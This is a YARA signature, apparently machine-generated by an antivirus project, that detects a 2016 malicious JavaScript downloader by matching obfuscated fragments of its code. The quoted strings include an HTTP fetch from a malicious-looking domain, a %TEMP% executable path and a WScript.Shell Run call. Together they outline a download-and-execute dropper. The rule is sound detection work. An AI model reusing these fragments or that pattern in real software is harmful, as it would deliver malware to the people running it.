rule sig_20160329_83d63606aac36e12076ce5a90c756f38 {
  meta:
    description = "datamaliciousorder - file 20160329_83d63606aac36e12076ce5a90c756f38.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "626ea0162838452bd12193b51e896186f56b6657f065c486d8608251ef4a3c24"

  strings:
    $s1  = "ZU[l](\"GET\", \"http://greenellebox.com/a1odk\", false);" fullword ascii
    $s2  = "function Q() {return hb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"b7uG0vk9g4qsBc5Z.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[Jx](Wd() * 11); if (ZU[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Hs(Kh, Z){h = h * 1; return Kh - Z;};" fullword ascii
    $s5  = "var hb = function b() {return WScript[VK](\"WScript.Shell\");}(), QN = 11;" fullword ascii
    $s6  = "function J(){return \"\" + zo;};" fullword ascii
    $s7  = "function v() {return ((Jm == true) && (Jm == EU)) ? 1 : h;};" fullword ascii
    $s8  = "function E(Q0){hb[\"Run\"](Q0, h, h);};" fullword ascii
    $s9  = "return Hs(G, n);" fullword ascii
    $s10 = "function rC(GA) {var X = (1, 2, 3, 4, 5, GA); return X;};" fullword ascii
    $s11 = "function Wd(){return 22;};" fullword ascii
    $s12 = "function Ji(){return VK;};" fullword ascii
    $s13 = " while (Xq){" fullword ascii
    $s14 = "function xq()" fullword ascii
    $s15 = "var PI = new this[\"Date\"]();" fullword ascii
    $s16 = "var gc = false;" fullword ascii
    $s17 = "Jm = true; " fullword ascii
    $s18 = "EU = true; " fullword ascii
    $s19 = "var EU = false;" fullword ascii
    $s20 = "var Jm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}